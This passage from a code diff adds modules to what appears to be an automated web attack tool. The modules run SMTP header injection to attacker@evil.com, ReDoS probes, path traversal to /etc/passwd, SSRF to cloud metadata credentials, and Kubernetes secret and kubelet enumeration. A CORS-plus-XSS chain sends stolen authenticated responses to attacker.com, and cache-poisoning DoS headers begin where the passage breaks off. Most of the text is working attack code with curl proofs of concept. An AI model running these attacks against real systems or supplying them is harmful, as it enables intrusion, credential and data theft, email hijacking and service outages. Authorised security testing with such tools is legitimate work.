+                if self.SSI_CONFIRM.search(body) or \
+                   ("169.254" in body) or \
+                   (ptype == "ESI" and "<esi:" not in body and len(body) > 50 and
+                    "meta-data" in body.lower()):
+                    high(f"  {ptype} injection CONFIRMED: param={param}")
+                    profile.findings.append(Finding(
+                        id=f"P17-{ptype}-INJECT-001",
+                        title=f"{ptype} Injection — OS command/file read via '{param}'",
+                        severity="CRITICAL", cvss=9.8,
+                        cwe="CWE-97" if ptype == "SSI" else "CWE-918",
+                        description=(
+                            f"{ptype} directives in parameter '{param}' are executed by the server. "
+                            f"{'RCE achieved via <!--#exec cmd-->.' if ptype == 'SSI' else 'SSRF/file-read via ESI include.'}"
+                        ),
+                        evidence=f"param={param} | type={ptype} | response={body[:150]}",
+                        reproduction=f"GET {base}?{param}={urllib.parse.quote(payload)}",
+                        poc_curl=(
+                            f"curl -sk '{base}?{param}={urllib.parse.quote(payload)}'"
+                        ),
+                        category=f"{ptype} Injection",
+                        remediation=(
+                            "Disable SSI directives (nginx: ssi off; Apache: remove Includes from Options). "
+                            "Disable ESI processing for user-controlled content. "
+                            "Reject HTML comment syntax in all user input."
+                        )
+                    ))
+                    return profile
+        info("  No SSI/ESI injection confirmed")
+        return profile
+
+
+# ── t375: SMTP Header Injection Chain ───────────────────────
+class SMTPHeaderInjectionChain:
+    """Inject SMTP headers (Cc, Bcc, To) into contact form and password-reset
+    email fields to redirect emails to attacker-controlled addresses."""
+    NAME = "SMTP Header Injection Chain"
+    CONTACT_PATHS = ["/contact", "/api/contact", "/contact-us",
+                     "/api/feedback", "/feedback", "/support",
+                     "/api/email", "/api/notify", "/api/send"]
+    RESET_PATHS   = ["/api/password-reset", "/api/forgot-password",
+                     "/password-reset", "/forgot-password",
+                     "/api/account/reset", "/api/auth/forgot"]
+    INJECT_PAYLOADS = [
+        "victim@x.com%0aCc:%20attacker@evil.com",
+        "victim@x.com%0d%0aBcc:%20attacker@evil.com",
+        "victim@x.com\r\nCc:\tattacker@evil.com",
+        "victim@x.com%0d%0aTo:%20attacker@evil.com",
+    ]
+    SUCCESS_INDICATORS = ["sent", "success", "email sent", "check your",
+                          "message received", "200", "thank you"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("SMTP-HEADER-INJECT-375: Email form Cc/Bcc injection for mail spoofing/ATO")
+        base = profile.url.rstrip("/")
+        all_paths = self.CONTACT_PATHS + self.RESET_PATHS
+        for path in all_paths:
+            for payload in self.INJECT_PAYLOADS:
+                bodies = [
+                    json.dumps({"email": payload, "message": "test", "name": "test"}).encode(),
+                    json.dumps({"to": payload, "subject": "test", "body": "test"}).encode(),
+                    f"email={urllib.parse.quote(payload)}&message=test&name=test".encode(),
+                ]
+                for body_bytes in bodies:
+                    ct = ("application/json" if body_bytes.startswith(b"{")
+                          else "application/x-www-form-urlencoded")
+                    r = _fetch(f"{base}{path}", cfg.ua, cfg.timeout, method="POST",
+                               data=body_bytes, extra_headers={"Content-Type": ct})
+                    if r.status == 0:
+                        continue
+                    resp_text = (r.body or b"").decode("utf-8", errors="replace").lower()
+                    if r.status in (200, 201, 202, 204) and \
+                       any(s in resp_text for s in self.SUCCESS_INDICATORS):
+                        high(f"  SMTP header injection likely at {path}")
+                        profile.findings.append(Finding(
+                            id="P17-SMTP-INJECT-001",
+                            title=f"SMTP Header Injection — email spoofing via {path}",
+                            severity="HIGH", cvss=7.5, cwe="CWE-93",
+                            description=(
+                                f"The email field at {path} accepts CRLF sequences that inject "
+                                f"additional SMTP headers (Cc/Bcc/To). An attacker can receive "
+                                f"copies of all outgoing emails (including password reset links) "
+                                f"or spoof the sender address."
+                            ),
+                            evidence=f"path={path} | payload={payload[:60]} | response_status={r.status}",
+                            reproduction=(
+                                f"POST {base}{path}\n"
+                                f"email={payload}&message=test"
+                            ),
+                            poc_curl=(
+                                f"curl -sk -X POST '{base}{path}' "
+                                f"-d 'email={payload}&message=test&name=test'"
+                            ),
+                            category="SMTP Injection",
+                            remediation=(
+                                "Strip CR (\\r) and LF (\\n) characters from all email address inputs. "
+                                "Validate email format with a strict RFC5322 regex before use. "
+                                "Use a well-tested mail library that handles header sanitization."
+                            )
+                        ))
+                        return profile
+        info("  No SMTP header injection confirmed")
+        return profile
+
+
+# ── t376: ReDoS Timing Prober ────────────────────────────────
+class ReDoSTimingProber:
+    """Send catastrophically-backtracking regular expression patterns to
+    REST API endpoints and measure response time to confirm ReDoS."""
+    NAME = "ReDoS Timing Prober"
+    REDOS_PATTERNS = [
+        "a" * 25 + "!",                   # (a+)+ style
+        "a" * 20 + "X" + "a" * 20,        # alternation backtrack
+        "([a-zA-Z]+)*!" + "a" * 25,       # nested quantifier
+        "aaaaaaaaaaaaaaaaaaaaaaaaaab",     # classic (a|aa)* probe
+        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB",
+        "(a|aa)+" + "b" + "a" * 20,
+    ]
+    TIME_THRESHOLD = 3.0  # seconds
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("REDOS-TIMING-376: Catastrophic backtracking regex patterns with timing analysis")
+        base = profile.url.rstrip("/")
+        params = list(dict.fromkeys(profile.parameters[:8])) or ["q", "search", "filter", "match"]
+        baseline_times = []
+        short_probe = "apex_test_123"
+        for param in params[:3]:
+            t0 = time.time()
+            _fetch(f"{base}?{param}={short_probe}", cfg.ua, cfg.timeout)
+            baseline_times.append(time.time() - t0)
+        baseline_avg = sum(baseline_times) / max(len(baseline_times), 1)
+        for param in params:
+            for pattern in self.REDOS_PATTERNS:
+                t0 = time.time()
+                r = _fetch(f"{base}?{param}={urllib.parse.quote(pattern)}",
+                           cfg.ua, cfg.timeout)
+                elapsed = time.time() - t0
+                if elapsed > baseline_avg + self.TIME_THRESHOLD and r.status != 0:
+                    high(f"  ReDoS candidate: param={param} time={elapsed:.1f}s "
+                         f"(baseline={baseline_avg:.1f}s)")
+                    profile.findings.append(Finding(
+                        id="P17-REDOS-001",
+                        title=f"ReDoS (Regex Denial of Service) — param '{param}' "
+                              f"({elapsed:.1f}s vs {baseline_avg:.1f}s baseline)",
+                        severity="HIGH", cvss=7.5, cwe="CWE-1333",
+                        description=(
+                            f"Parameter '{param}' shows {elapsed:.1f}s response time vs "
+                            f"{baseline_avg:.1f}s baseline when given a catastrophically-backtracking "
+                            f"regex input. This indicates a server-side regex applied to user input "
+                            f"with no timeout, allowing a single request to block an entire thread."
+                        ),
+                        evidence=(
+                            f"param={param} | pattern={pattern[:50]} | "
+                            f"time={elapsed:.2f}s | baseline={baseline_avg:.2f}s"
+                        ),
+                        reproduction=f"GET {base}?{param}={urllib.parse.quote(pattern)}",
+                        poc_curl=(
+                            f"time curl -sk '{base}?{param}={urllib.parse.quote(pattern)}'"
+                        ),
+                        category="Denial of Service",
+                        remediation=(
+                            "Rewrite vulnerable regex patterns to avoid catastrophic backtracking. "
+                            "Use re2 or RE2-based libraries (Python re module is vulnerable; "
+                            "use the 'regex' package with timeout). "
+                            "Set server-side regex timeouts and limit input length."
+                        )
+                    ))
+                    return profile
+        info("  No ReDoS timing anomaly detected")
+        return profile
+
+
+# ── t377: Client-Side Path Traversal (CSPT) ─────────────────
+class ClientSidePathTraversal:
+    """Detect client-side path traversal where JavaScript uses a URL
+    parameter to construct fetch()/XHR requests, allowing the path
+    to be redirected to read internal endpoints or sensitive files."""
+    NAME = "Client-Side Path Traversal"
+    TRAVERSAL_PROBES = [
+        "../api/admin",
+        "../../etc/passwd",
+        "../../../admin/users",
+        ".%2e/.%2e/admin",
+        "%2e%2e%2fadmin",
+        "..%2fadmin",
+        "../internal/config",
+        "../../api/internal",
+    ]
+    PARAMS = ["path", "file", "url", "resource", "endpoint", "src",
+              "dest", "ref", "page", "view", "redirect", "route"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CSPT-377: Client-side path traversal via fetch/XHR path parameter manipulation")
+        base = profile.url.rstrip("/")
+        api_bases = [base, f"{base}/api", f"{base}/api/v1", f"{base}/api/v2"]
+        hits = []
+        for api_base in api_bases:
+            for param in self.PARAMS:
+                for probe in self.TRAVERSAL_PROBES:
+                    test_url = f"{api_base}?{param}={urllib.parse.quote(probe)}"
+                    r = _fetch(test_url, cfg.ua, cfg.timeout)
+                    if r.status in (200, 201) and r.body:
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        sensitive = any(k in body for k in
+                                        ["root:", "/bin/bash", '"users"', '"admin"',
+                                         '"password"', '"secret"', '"token"', "email"])
+                        if sensitive:
+                            hits.append({"param": param, "probe": probe,
+                                         "url": test_url, "body": body[:120]})
+                            high(f"  CSPT confirmed: param={param} probe={probe[:30]}")
+        if hits:
+            h = hits[0]
+            profile.findings.append(Finding(
+                id="P17-CSPT-001",
+                title=f"Client-Side Path Traversal — parameter '{h['param']}'",
+                severity="HIGH", cvss=8.1, cwe="CWE-22",
+                description=(
+                    f"Parameter '{h['param']}' controls a server-side resource path. "
+                    f"Path traversal sequences allow access to internal API endpoints "
+                    f"or sensitive files beyond the intended directory."
+                ),
+                evidence=f"param={h['param']} | probe={h['probe']} | body={h['body'][:100]}",
+                reproduction=f"GET {h['url']}",
+                poc_curl=f"curl -sk '{h['url']}'",
+                category="Path Traversal",
+                remediation=(
+                    "Validate and canonicalize path parameters server-side. "
+                    "Use allowlists for permitted paths/resources. "
+                    "Never pass raw URL parameters directly to file or API routing."
+                )
+            ))
+        else:
+            info("  No client-side path traversal confirmed")
+        return profile
+
+
+# ── t378: API Versioning Bypass Chain ───────────────────────
+class APIVersioningBypassChain:
+    """Probe deprecated API versions that may lack security patches applied
+    to the current version — auth bypasses, verbose errors, or removed
+    input validation are commonly left in v0/v1/beta endpoints."""
+    NAME = "API Versioning Bypass Chain"
+    VERSION_PATHS = [
+        "/api/v0", "/api/v0.1", "/api/beta", "/api/alpha",
+        "/api/v1",  "/api/v2",  "/api/v3",
+        "/v0/api",  "/v1/api",  "/v2/api",
+        "/api/old", "/api/legacy", "/api/internal",
+        "/api/dev",  "/api/test",  "/api/debug",
+        "/api/1.0",  "/api/2.0",
+    ]
+    SENSITIVE_ENDPOINTS = [
+        "/users", "/users/admin", "/admin", "/config",
+        "/settings", "/debug", "/health/detail",
+        "/internal", "/management",
+    ]
+    AUTH_BYPASS_INDICATORS = ['"role":', '"admin":', '"users":', '"password"',
+                               '"secret"', '"token":', '"email":', 'stack trace',
+                               'exception', 'internal server error']
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("API-VERSION-BYPASS-378: Deprecated/legacy API version enumeration + auth bypass")
+        base = profile.url.rstrip("/")
+        # Fingerprint current API version
+        current_ver = None
+        for v in ["/api/v1", "/api/v2", "/api/v3"]:
+            r = _fetch(f"{base}{v}", cfg.ua, cfg.timeout)
+            if r.status not in (404, 0):
+                current_ver = v
+                break
+        hits = []
+        for ver in self.VERSION_PATHS:
+            if ver == current_ver:
+                continue
+            ver_r = _fetch(f"{base}{ver}", cfg.ua, cfg.timeout)
+            if ver_r.status in (0, 404):
+                continue
+            ok(f"  Version endpoint alive: {ver} (HTTP {ver_r.status})")
+            for ep in self.SENSITIVE_ENDPOINTS:
+                r = _fetch(f"{base}{ver}{ep}", cfg.ua, cfg.timeout)
+                if r.status == 0:
+                    continue
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                if r.status == 200 and any(ind.lower() in body.lower()
+                                            for ind in self.AUTH_BYPASS_INDICATORS):
+                    hits.append({"version": ver, "endpoint": ep,
+                                 "status": r.status, "body": body[:150]})
+                    high(f"  API version bypass: {ver}{ep} → HTTP {r.status}")
+        if hits:
+            h = hits[0]
+            profile.findings.append(Finding(
+                id="P17-API-VERSION-BYPASS-001",
+                title=f"Deprecated API Version Exposes Sensitive Data: {h['version']}{h['endpoint']}",
+                severity="HIGH", cvss=8.6, cwe="CWE-1059",
+                description=(
+                    f"Legacy API version {h['version']} exposes {h['endpoint']} without "
+                    f"the security controls present in the current version. "
+                    f"Attackers can access sensitive data by targeting obsolete versions."
+                ),
+                evidence="\n".join(
+                    f"{x['version']}{x['endpoint']} HTTP {x['status']}: {x['body'][:80]}"
+                    for x in hits[:4]
+                ),
+                reproduction="\n".join(
+                    f"curl -sk '{base}{x['version']}{x['endpoint']}'" for x in hits[:3]
+                ),
+                poc_curl="\n".join(
+                    f"curl -sk '{base}{x['version']}{x['endpoint']}'" for x in hits[:3]
+                ),
+                category="API Security",
+                remediation=(
+                    "Deprecate and decommission old API versions. Apply authentication and "
+                    "authorization middleware consistently across ALL API versions. "
+                    "Use API gateway policies to enforce version retirement dates."
+                )
+            ))
+        else:
+            info("  No deprecated API version bypass found")
+        return profile
+
+
+# ── t379: GraphQL Type Confusion IDOR ───────────────────────
+class GraphQLTypeConfusionIDOR:
+    """Exploit GraphQL node interface implementations where the `id` field
+    is globally unique — by passing an ID from one object type into a
+    query for another type, cross-type object access may be possible."""
+    NAME = "GraphQL Type Confusion IDOR"
+
+    def _find_gql_endpoint(self, base: str, cfg: Config) -> Optional[str]:
+        for path in ["/graphql", "/api/graphql", "/gql", "/graph", "/api/gql"]:
+            r = _fetch(f"{base}{path}", cfg.ua, cfg.timeout, method="POST",
+                       data=b'{"query":"{__typename}"}',
+                       extra_headers={"Content-Type": "application/json"})
+            if r.status in (200, 400) and "data" in (r.body or b"").decode("utf-8",
+                                                                            errors="replace"):
+                return f"{base}{path}"
+        return None
+
+    def _introspect_types(self, gql_url: str, cfg: Config) -> List[Dict]:
+        query = json.dumps({"query": """
+          { __schema { queryType { fields { name type { name kind ofType { name kind } } } }
+            types { name kind fields { name type { name kind ofType { name kind } } } } } }
+        """}).encode()
+        r = _fetch(gql_url, cfg.ua, cfg.timeout, method="POST", data=query,
+                   extra_headers={"Content-Type": "application/json"})
+        try:
+            return json.loads((r.body or b"").decode("utf-8", errors="replace"))
+        except Exception:
+            return {}
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("GQL-TYPE-IDOR-379: GraphQL node interface type confusion cross-object IDOR")
+        base = profile.url.rstrip("/")
+        gql_url = self._find_gql_endpoint(base, cfg)
+        if not gql_url:
+            info("  No GraphQL endpoint found")
+            return profile
+        schema = self._introspect_types(gql_url, cfg)
+        schema_str = json.dumps(schema)
+        # Find object types with id fields
+        object_types = re.findall(r'"name"\s*:\s*"(\w+)".*?"kind"\s*:\s*"OBJECT"', schema_str)
+        object_types = [t for t in object_types if not t.startswith("__")][:8]
+        if len(object_types) < 2:
+            info(f"  Only {len(object_types)} object types — skipping type confusion test")
+            return profile
+        ok(f"  Found {len(object_types)} GraphQL object types: {object_types[:5]}")
+        # Try cross-type node queries
+        test_ids = ["1", "2", "3", "dXNlcjox", "dXNlcjoy",  # base64 encoded node IDs
+                    "UGFja2FnZTox", "T3JkZXI6MQ=="]
+        hits = []
+        for type_name in object_types[:4]:
+            for test_id in test_ids[:3]:
+                query = json.dumps({"query": f"""
+                  {{ node(id: "{test_id}") {{
+                    id __typename
+                    ... on {type_name} {{ id }}
+                  }} }}
+                """}).encode()
+                r = _fetch(gql_url, cfg.ua, cfg.timeout, method="POST", data=query,
+                           extra_headers={"Content-Type": "application/json"})
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                if r.status == 200 and '"data"' in body and '"node"' in body:
+                    data = json.loads(body).get("data", {})
+                    if data.get("node") and data["node"].get("__typename") != type_name:
+                        hits.append({
+                            "query_type": type_name, "id": test_id,
+                            "returned_type": data["node"].get("__typename"),
+                            "data": json.dumps(data)[:200]
+                        })
+                        high(f"  Type confusion IDOR: queried {type_name} id={test_id} "
+                             f"→ got {data['node'].get('__typename')}")
+        if hits:
+            h = hits[0]
+            profile.findings.append(Finding(
+                id="P17-GQL-TYPE-IDOR-001",
+                title=f"GraphQL Type Confusion IDOR: {h['query_type']} → {h['returned_type']}",
+                severity="HIGH", cvss=8.2, cwe="CWE-639",
+                description=(
+                    f"GraphQL node interface allows cross-type object access. "
+                    f"Querying a {h['query_type']} ID returns a {h['returned_type']} object, "
+                    f"indicating missing type enforcement on the node resolver. "
+                    f"An attacker can enumerate IDs across different object types."
+                ),
+                evidence="\n".join(
+                    f"query_type={x['query_type']} id={x['id']} got={x['returned_type']}"
+                    for x in hits[:3]
+                ),
+                reproduction=(
+                    f"POST {gql_url}\n"
+                    f'Body: {{"query":"{{ node(id: \\"{h["id"]}\\") {{ id __typename }} }}"}}'
+                ),
+                poc_curl=(
+                    f"curl -sk -X POST '{gql_url}' "
+                    f"-H 'Content-Type: application/json' "
+                    f"-d '{{\"query\":\"{{ node(id: \\\"{h['id']}\\\") {{ id __typename }} }}\"}}'  "
+                ),
+                category="GraphQL / IDOR",
+                remediation=(
+                    "Implement type checking in node resolvers — verify that the returned object "
+                    "matches the requested type before returning data. "
+                    "Use opaque, type-prefixed IDs that cannot be cross-referenced."
+                )
+            ))
+        else:
+            info("  No GraphQL type confusion IDOR found")
+        return profile
+
+
+# ── t380: Headless Browser SSRF Chain ───────────────────────
+class HeadlessBrowserSSRF:
+    """Detect PDF-export, screenshot, and HTML-to-image endpoints that
+    use headless Chromium/wkhtmltopdf, then exploit via file:// and
+    internal network URLs for local file read and SSRF."""
+    NAME = "Headless Browser SSRF"
+    RENDER_PATHS = [
+        "/api/pdf", "/api/export/pdf", "/api/screenshot", "/api/render",
+        "/export", "/api/export", "/api/convert", "/print",
+        "/api/print", "/generate/pdf", "/api/generate",
+        "/api/report", "/report/export", "/api/preview",
+    ]
+    SSRF_PAYLOADS = [
+        ("file:///etc/passwd",         "root:"),
+        ("file:///etc/hostname",       ""),
+        ("file:///proc/version",       "Linux"),
+        ("http://169.254.169.254/latest/meta-data/",  "ami-id"),
+        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ""),
+        ("http://[::1]/",              ""),
+        ("http://localhost/",          ""),
+        ("http://127.0.0.1:8080/",     ""),
+    ]
+    URL_PARAMS = ["url", "src", "href", "target", "link", "path",
+                  "page", "html", "content", "render", "template"]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("HEADLESS-SSRF-380: Headless browser endpoint detection + file/SSRF exploitation")
+        base = profile.url.rstrip("/")
+        for path in self.RENDER_PATHS:
+            r_probe = _fetch(f"{base}{path}", cfg.ua, cfg.timeout)
+            if r_probe.status in (0, 404):
+                continue
+            ok(f"  Render endpoint alive: {path} (HTTP {r_probe.status})")
+            for url_param in self.URL_PARAMS:
+                for ssrf_url, confirm_str in self.SSRF_PAYLOADS:
+                    for method, body_fn in [
+                        ("GET",  lambda u, p: None),
+                        ("POST", lambda u, p: json.dumps({p: u}).encode()),
+                    ]:
+                        body_data = body_fn(ssrf_url, url_param)
+                        extra_h = {"Content-Type": "application/json"} if body_data else {}
+                        test_url = (f"{base}{path}?{url_param}={urllib.parse.quote(ssrf_url)}"
+                                    if method == "GET" else f"{base}{path}")
+                        r = _fetch(test_url, cfg.ua, cfg.timeout, method=method,
+                                   data=body_data, extra_headers=extra_h)
+                        body = (r.body or b"").decode("utf-8", errors="replace")
+                        if r.status in (200, 201) and (
+                            (confirm_str and confirm_str in body) or
+                            ("root:" in body) or
+                            ("ami-id" in body) or
+                            ("/bin/sh" in body)
+                        ):
+                            high(f"  Headless SSRF CONFIRMED: {path} param={url_param} "
+                                 f"url={ssrf_url[:40]}")
+                            profile.chain_state["headless_ssrf_url"] = f"{base}{path}"
+                            profile.findings.append(Finding(
+                                id="P17-HEADLESS-SSRF-001",
+                                title=f"Headless Browser SSRF — {path} renders {ssrf_url[:50]}",
+                                severity="CRITICAL", cvss=9.8, cwe="CWE-918",
+                                description=(
+                                    f"The {path} endpoint renders arbitrary URLs using a headless "
+                                    f"browser (Chromium/wkhtmltopdf). Injecting file:// or "
+                                    f"internal network URLs allows reading local files and "
+                                    f"pivoting to internal services. "
+                                    f"Confirmed: {ssrf_url} returned '{body[:60]}'"
+                                ),
+                                evidence=f"path={path} param={url_param} ssrf={ssrf_url} "
+                                         f"response={body[:150]}",
+                                reproduction=(
+                                    f"{'GET' if method == 'GET' else 'POST'} {base}{path}\n"
+                                    f"{'?' + url_param + '=' + ssrf_url if method == 'GET' else 'Body: {' + url_param + ':' + ssrf_url + '}'}"
+                                ),
+                                poc_curl=(
+                                    f"curl -sk '{base}{path}?{url_param}={urllib.parse.quote(ssrf_url)}'"
+                                    if method == "GET" else
+                                    f"curl -sk -X POST '{base}{path}' "
+                                    f"-H 'Content-Type: application/json' "
+                                    f"-d '{{\"{ url_param}\":\"{ssrf_url}\"}}'"
+                                ),
+                                category="SSRF / Headless Browser",
+                                remediation=(
+                                    "Allowlist only https:// URLs pointing to external domains. "
+                                    "Block file://, http://localhost, RFC1918 ranges, and "
+                                    "cloud metadata IPs at the rendering layer. "
+                                    "Run headless browsers in isolated network namespaces."
+                                )
+                            ))
+                            return profile
+        info("  No headless browser SSRF confirmed")
+        return profile
+
+
+# ── t381: CORS + Reflected XSS Exfiltration Chain ────────────
+class CORSXSSExfilChain:
+    """Chain a CORS wildcard (or credentialed CORS misconfiguration) with
+    a reflected XSS on the same origin to exfiltrate authenticated API
+    responses to an attacker-controlled endpoint."""
+    NAME = "CORS + XSS Exfil Chain"
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("CORS-XSS-EXFIL-381: Chain CORS wildcard + reflected XSS for auth data theft")
+        base = profile.url.rstrip("/")
+        # Find CORS misconfiguration
+        cors_vuln_endpoints = []
+        test_origins = ["https://evil.com", "null", f"https://evil.{profile.apex}"]
+        api_paths = ["/api/user", "/api/profile", "/api/me", "/api/v1/user",
+                     "/api/account", "/api/dashboard"]
+        for path in api_paths:
+            for origin in test_origins:
+                r = _fetch(f"{base}{path}", cfg.ua, cfg.timeout,
+                           extra_headers={"Origin": origin})
+                acao = r.headers.get("access-control-allow-origin", "")
+                acac = r.headers.get("access-control-allow-credentials", "false")
+                if (acao == "*") or (acao == origin and acac.lower() == "true"):
+                    cors_vuln_endpoints.append({
+                        "path": path, "origin": origin, "acao": acao, "acac": acac
+                    })
+                    ok(f"  CORS vuln endpoint: {path} ACAO={acao} ACAC={acac}")
+        # Find reflected XSS
+        xss_params = list(dict.fromkeys(profile.parameters[:8])) or ["q", "search"]
+        xss_probe = "<script>alert(document.domain)</script>"
+        xss_found = None
+        for param in xss_params:
+            r = _fetch(f"{base}?{param}={urllib.parse.quote(xss_probe)}",
+                       cfg.ua, cfg.timeout)
+            body = (r.body or b"").decode("utf-8", errors="replace")
+            if xss_probe in body or "alert(document.domain)" in body:
+                xss_found = param
+                ok(f"  Reflected XSS found: param={param}")
+                break
+        if cors_vuln_endpoints and xss_found:
+            cve = cors_vuln_endpoints[0]
+            exfil_payload = (
+                f"<script>"
+                f"fetch('{base}{cve['path']}',{{credentials:'include'}}).then(r=>r.text()).then(d=>"
+                f"fetch('https://attacker.com/exfil?d='+encodeURIComponent(d)))"
+                f"</script>"
+            )
+            high(f"  CORS+XSS chain confirmed!")
+            profile.findings.append(Finding(
+                id="P17-CORS-XSS-EXFIL-001",
+                title=f"CORS + Reflected XSS Chain: authenticated data exfiltration",
+                severity="CRITICAL", cvss=9.3, cwe="CWE-942",
+                description=(
+                    f"CORS misconfiguration on {cve['path']} (ACAO={cve['acao']}, "
+                    f"ACAC={cve['acac']}) combined with reflected XSS on param '{xss_found}' "
+                    f"allows a malicious page to steal authenticated API responses. "
+                    f"An attacker embeds the XSS payload to make cross-origin requests "
+                    f"to the CORS-enabled API and exfiltrate the response."
+                ),
+                evidence=(
+                    f"CORS: {cve['path']} ACAO={cve['acao']} ACAC={cve['acac']}\n"
+                    f"XSS: param={xss_found} payload={xss_probe}"
+                ),
+                reproduction=(
+                    f"1. Host page with XSS payload targeting {base}?{xss_found}=<payload>\n"
+                    f"2. XSS fetches {base}{cve['path']} with user's credentials via CORS\n"
+                    f"3. Response exfiltrated to attacker server"
+                ),
+                poc_curl=(
+                    f"# Reflected XSS trigger:\n"
+                    f"curl -sk '{base}?{xss_found}={urllib.parse.quote(exfil_payload[:80])}'\n"
+                    f"# CORS probe:\n"
+                    f"curl -sk '{base}{cve['path']}' -H 'Origin: {cve['origin']}' -v 2>&1 "
+                    f"| grep -i 'access-control'"
+                ),
+                category="CORS / XSS",
+                remediation=(
+                    "Restrict CORS origins to explicit trusted domains. "
+                    "Never combine wildcard ACAO with credentialed requests. "
+                    "Fix reflected XSS: encode all user input in HTML context."
+                )
+            ))
+        elif cors_vuln_endpoints:
+            info("  CORS vuln found but no reflected XSS to chain with")
+        elif xss_found:
+            info("  Reflected XSS found but no CORS vuln to chain with")
+        else:
+            info("  No CORS+XSS chain exploitable")
+        return profile
+
+
+# ── t382: Kubernetes RBAC Enumeration Chain ──────────────────
+class KubernetesRBACEnumChain:
+    """Reach the Kubernetes API server (directly or via SSRF) and enumerate
+    RBAC permissions, ClusterRoles, and ServiceAccount tokens to assess
+    lateral movement potential."""
+    NAME = "Kubernetes RBAC Enum Chain"
+    K8S_DIRECT_PORTS = [6443, 8443, 8080, 10250, 10255]
+    K8S_API_PATHS = [
+        "/api/v1/namespaces",
+        "/api/v1/secrets",
+        "/api/v1/configmaps",
+        "/api/v1/serviceaccounts",
+        "/apis/rbac.authorization.k8s.io/v1/clusterroles",
+        "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
+        "/api/v1/namespaces/default/secrets",
+        "/api/v1/namespaces/kube-system/secrets",
+    ]
+    KUBELET_PATHS = ["/pods", "/runningpods", "/exec", "/stats/summary"]
+    SSRF_K8S_TARGETS = [
+        "http://kubernetes.default.svc/api/v1/namespaces",
+        "http://kubernetes.default.svc.cluster.local/api/v1/secrets",
+        "http://10.96.0.1/api/v1/namespaces",
+    ]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        skill("K8S-RBAC-ENUM-382: Kubernetes API RBAC enumeration for lateral movement")
+        base = profile.url.rstrip("/")
+        k8s_url = None
+        hits = []
+        # Direct K8s API probe
+        host = profile.host
+        for port in self.K8S_DIRECT_PORTS:
+            test = f"https://{host}:{port}/api/v1"
+            r = _fetch(test, cfg.ua, 5)
+            if r.status in (200, 401, 403) and (
+                "APIVersions" in (r.body or b"").decode("utf-8", errors="replace")
+                or "kubernetes" in r.headers.get("server", "").lower()
+            ):
+                k8s_url = f"https://{host}:{port}"
+                ok(f"  K8s API found directly: {k8s_url}")
+                break
+        # SSRF-based K8s probe
+        if not k8s_url and profile.chain_state.get("ssrf_confirmed"):
+            for ssrf_target in self.SSRF_K8S_TARGETS:
+                ssrf_base = profile.chain_state.get("ssrf_url", "")
+                if ssrf_base:
+                    r = _fetch(f"{ssrf_base}?url={urllib.parse.quote(ssrf_target)}",
+                               cfg.ua, cfg.timeout)
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if '"namespaces"' in body or '"APIVersions"' in body:
+                        k8s_url = "ssrf:" + ssrf_target
+                        ok(f"  K8s API reachable via SSRF")
+                        break
+        if not k8s_url:
+            info("  No K8s API endpoint accessible")
+            return profile
+        # Enumerate RBAC paths
+        api_base_url = k8s_url if not k8s_url.startswith("ssrf:") else ""
+        if api_base_url:
+            for api_path in self.K8S_API_PATHS:
+                r = _fetch(f"{api_base_url}{api_path}", "kubectl/v1.28", 8)
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                if r.status in (200,) and ('"items"' in body or '"rules"' in body):
+                    hits.append({"path": api_path, "status": r.status,
+                                 "body": body[:200]})
+                    high(f"  K8s RBAC accessible: {api_path}")
+            # Kubelet check
+            for port in [10250, 10255]:
+                for kpath in self.KUBELET_PATHS:
+                    kurl = f"https://{host}:{port}{kpath}"
+                    r = _fetch(kurl, "kubectl/v1.28", 5)
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if r.status == 200 and '"name"' in body:
+                        hits.append({"path": f":{port}{kpath}", "status": r.status,
+                                     "body": body[:200]})
+                        high(f"  Kubelet API accessible: :{port}{kpath}")
+        if hits:
+            profile.findings.append(Finding(
+                id="P17-K8S-RBAC-001",
+                title=f"Kubernetes API Exposed — {len(hits)} endpoint(s) accessible without auth",
+                severity="CRITICAL", cvss=10.0, cwe="CWE-284",
+                description=(
+                    f"The Kubernetes API server is accessible at {k8s_url}. "
+                    f"{len(hits)} endpoint(s) returned data without authentication. "
+                    f"An attacker can enumerate cluster resources, extract secrets, "
+                    f"and potentially achieve cluster-wide RCE via pod creation."
+                ),
+                evidence="\n".join(
+                    f"{x['path']} HTTP {x['status']}: {x['body'][:80]}"
+                    for x in hits[:5]
+                ),
+                reproduction="\n".join(
+                    f"curl -sk '{api_base_url}{x['path']}'" for x in hits[:3]
+                ) if api_base_url else f"K8s reachable via SSRF: {k8s_url}",
+                poc_curl=(
+                    f"kubectl --server={api_base_url} --insecure-skip-tls-verify get secrets\n"
+                    + "\n".join(f"curl -sk '{api_base_url}{x['path']}'" for x in hits[:2])
+                ) if api_base_url else f"# Access K8s via SSRF at {k8s_url}",
+                category="Cloud / Kubernetes",
+                remediation=(
+                    "Enable K8s API server authentication (RBAC + client cert or OIDC). "
+                    "Never expose the API server or kubelet on the internet. "
+                    "Use NetworkPolicies to restrict pod-to-API communication. "
+                    "Rotate all secrets found in accessible namespaces."
+                )
+            ))
+        return profile
+
+
+# ── t383: Cache Poisoning DoS Chain ─────────────────────────
+class CachePoisoningDoSChain:
+    """Poison shared CDN/proxy caches with error responses (400/500)
+    to create a Denial of Service without rate-limiting — a single
+    request can deny all users access to a cached resource."""
+    NAME = "Cache Poisoning DoS Chain"
+    POISON_HEADERS = [
+        {"X-Forwarded-Host": "evil.com"},
+        {"X-Forwarded-Port": "9999"},
+        {"X-Forwarded-Scheme": "nothttps"},
